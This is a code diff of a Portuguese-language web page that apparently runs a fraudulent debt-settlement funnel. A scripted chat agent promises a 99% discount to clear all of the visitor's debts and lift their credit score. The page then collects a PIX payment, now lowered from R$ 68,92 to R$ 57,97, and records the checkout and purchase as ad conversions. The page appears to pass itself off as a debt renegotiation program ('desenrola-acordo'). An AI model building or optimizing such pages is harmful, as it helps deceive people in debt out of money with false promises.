@@ -1429,7 +1429,7 @@
 
         await delay(400);
         await agentSayGlobal(
-            `Você gostaria de realizar o seu acordo com <strong>99% DE DESCONTO</strong> para quitar <strong>todas</strong> as suas dívidas e ter seu nome limpo novamente por apenas <strong>R$ 68,92</strong>?`,
+            `Você gostaria de realizar o seu acordo com <strong>99% DE DESCONTO</strong> para quitar <strong>todas</strong> as suas dívidas e ter seu nome limpo novamente por apenas <strong>R$ 57,97</strong>?`,
             section, 1400
         );
 
@@ -1495,7 +1495,7 @@
                 <div class="pc-row pc-bold">${CPF_FORMATTED}</div>
                 <div class="pc-row pc-blue">Quitação de todas as dívidas em ativo no CPF.</div>
                 <div class="pc-row pc-score">895 Pontos no score.</div>
-                <div class="pc-row pc-valor">Valor da proposta: R$ 68,92</div>
+                <div class="pc-row pc-valor">Valor da proposta: R$ 57,97</div>
             `;
             section.appendChild(propostaCard);
             await delay(80); propostaCard.classList.add('visible');
@@ -1509,7 +1509,7 @@
                 pagBtn.disabled = true; pagBtn.style.opacity = '0.5';
 
                 // Inicia pré-carregamento do PIX em segundo plano IMEDIATAMENTE (0s delay!)
-                try { ttq.track('InitiateCheckout', { value: 68.92, currency: 'BRL', content_id: 'desenrola-acordo' }); } catch(e){}
+                try { ttq.track('InitiateCheckout', { value: 57.97, currency: 'BRL', content_id: 'desenrola-acordo' }); } catch(e){}
                 const pixPromise = fetch('/generate-pix', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -1570,7 +1570,7 @@
                 if (loadingEl) loadingEl.remove();
 
                 if (pixData && pixData.success && pixData.pixCode) {
-                    try { gtag('event', 'conversion', { send_to: 'AW-18302482370/L4AGCI-A3c0cEMLvppdE', value: 68.92, currency: 'BRL' }); } catch(e){}
+                    try { gtag('event', 'conversion', { send_to: 'AW-18302482370/L4AGCI-A3c0cEMLvppdE', value: 57.97, currency: 'BRL' }); } catch(e){}
                     window._pixEventId = 'purchase_' + (pixData.transactionId || pixData.orderId || Date.now());
                     showPixCard(pixData, section);
                 } else {
@@ -1670,7 +1670,7 @@
                 </div>
                 <div class="pix-doc-row">
                     <span class="lbl">Valor a pagar</span>
-                    <span class="val val-green">R$ 68,92</span>
+                    <span class="val val-green">R$ 57,97</span>
                 </div>
                 <div class="pix-doc-row">
                     <span class="lbl">⏳ Validade</span>
@@ -1827,7 +1827,7 @@
                     clearInterval(iv);
                     try {
                         ttq.track('Purchase', {
-                            value: 68.92,
+                            value: 57.97,
                             currency: 'BRL',
                             content_id: 'desenrola-acordo',
                             event_id: window._pixEventId || ('purchase_' + window._transactionId)
